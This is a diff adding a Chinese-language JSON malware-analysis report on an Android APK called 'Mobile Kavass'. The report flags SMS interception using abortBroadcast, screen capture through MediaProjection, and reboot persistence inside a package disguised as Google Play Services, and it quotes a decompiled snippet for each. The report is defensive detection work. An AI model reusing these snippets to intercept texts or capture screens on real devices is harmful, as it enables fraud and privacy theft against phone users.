@@ -1,0 +1,127 @@
+{
+  "APK信息": {
+    "文件名": "6e85bdd3bd0aa932c282af45d3233c625131e8895816d4f0436a61b843ef110c.apk",
+    "sha256": "6e85bdd3bd0aa932c282af45d3233c625131e8895816d4f0436a61b843ef110c",
+    "包名": "com.mobile.kavass",
+    "应用名": "Mobile Kavass",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 676.6
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\mobile\\kavass\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    if (extras != null) {\n        Object[] objArr = (Object[]) extras.get(\"pdus\");\n        SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n        for (int i = 0; i < objArr.length; i++) {\n            smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n        }\n        for (SmsMessage smsMessage : smsMessageArr) {\n            smsMessage.getDisplayOriginatingAddress();\n        }\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.a.format(new Date(smsMessage.getTimestampMillis()));\n                  }\n              }\n          }",
+          "behavior_description": "该BroadcastReceiver监听短信接收广播SMS_RECEIVED，收到短信后立即调用abortBroadcast()中止广播传播，阻止系统短信应用和其他应用收到短信，实现短信拦截隐藏。随后从intent的extras中提取pdus数据并解析为SmsMessage对象，读取发送方地址和短信内容，用于后续上传或指令处理。数据流向：intent.getExtras().get(\"pdus\")（短信PDU数据）→ abortBroadcast()（中止广播隐藏短信）+ SmsMessage.createFromPdu()（解析短信内容）",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "createVirtualDisplay",
+          "takeScreenshot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\swipe\\fanmenu\\services\\ScreenShotService;",
+          "method_signature": "g()",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.a = f().getMediaProjection(-1, c);\nthis.b = this.a.createVirtualDisplay(\"screen-mirror\", this.e, this.f, this.g, 16, this.d.getSurface(), null, null);\nImage acquireLatestImage = this.d.acquireLatestImage();\nAsyncTaskCompat.executeParallel(new b(), acquireLatestImage);",
+          "malicious_code_snippet_context": "              startActivity(intent);\n              return;\n          }\n>>>         this.a = f().getMediaProjection(-1, c);\n>>>     }\n>>> \n>>>     private MediaProjectionManager f() {\n          return (MediaProjectionManager) getSystemService(\"media_projection\");\n      }\n  ",
+          "behavior_description": "通过MediaProjection API获取屏幕投影权限，创建名为screen-mirror的VirtualDisplay进行屏幕镜像捕获，随后通过ImageReader.acquireLatestImage()获取最新屏幕帧图像，并将其传入AsyncTask异步任务（b类）进行处理，疑似将截屏数据静默上传至远程服务器，存在窃取用户屏幕敏感信息（如银行凭证、聊天内容等）的隐私泄露风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "android.intent.action.REBOOT"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\gms\\charger\\util\\CleanUtil;",
+          "method_signature": "if(sAutoStartActions != null)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "arrayList.add(\"android.intent.action.REBOOT\");",
+          "malicious_code_snippet_context": "          arrayList.add(\"android.intent.action.PACKAGE_REPLACED\");\n          arrayList.add(\"android.intent.action.PACKAGE_RESTARTED\");\n          arrayList.add(\"android.intent.action.PROVIDER_CHANGED\");\n>>>         arrayList.add(\"android.intent.action.REBOOT\");\n          arrayList.add(\"android.intent.action.SCREEN_OFF\");\n          arrayList.add(\"android.intent.action.SCREEN_ON\");\n          arrayList.add(\"android.intent.action.TIMEZONE_CHANGED\");",
+          "behavior_description": "该代码位于伪装为 Google Play Services 的恶意包(com.google.android.gms.charger.util.CleanUtil)中，通过将 android.intent.action.REBOOT 等大量系统广播 action 添加到 sAutoStartActions 列表，用于注册 BroadcastReceiver 监听设备重启等系统事件。当设备重启时，恶意应用可借此实现开机自启动和持久化保活，确保恶意服务在设备重启后自动恢复运行。数据来源为系统广播事件(REBOOT/SCREEN_ON/NEW_OUTGOING_CALL等)→触发恶意应用自启动与持久化保活机制。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
